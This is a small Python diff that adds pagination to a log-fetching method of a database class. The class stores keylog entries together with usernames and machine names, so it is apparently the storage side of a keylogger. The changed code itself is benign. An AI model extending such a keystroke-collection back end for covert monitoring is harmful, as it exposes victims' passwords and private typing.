@@ -32,8 +32,15 @@ class DB:
         ''', (timestamp, keylog, username, machine))
         self.conn.commit()
 
-    def fetch_logs(self):
-        self.cursor.execute('SELECT * FROM logs ORDER BY timestamp DESC')
+    def fetch_logs(self, offset=0, limit=None):
+        query = 'SELECT * FROM logs ORDER BY timestamp DESC'
+        params = []
+
+        if limit is not None:
+            query += ' LIMIT ? OFFSET ?'
+            params.extend([limit, offset])
+
+        self.cursor.execute(query, params)
         return [dict(row) for row in self.cursor.fetchall()]
 
     def get_by_username(self, username: str):
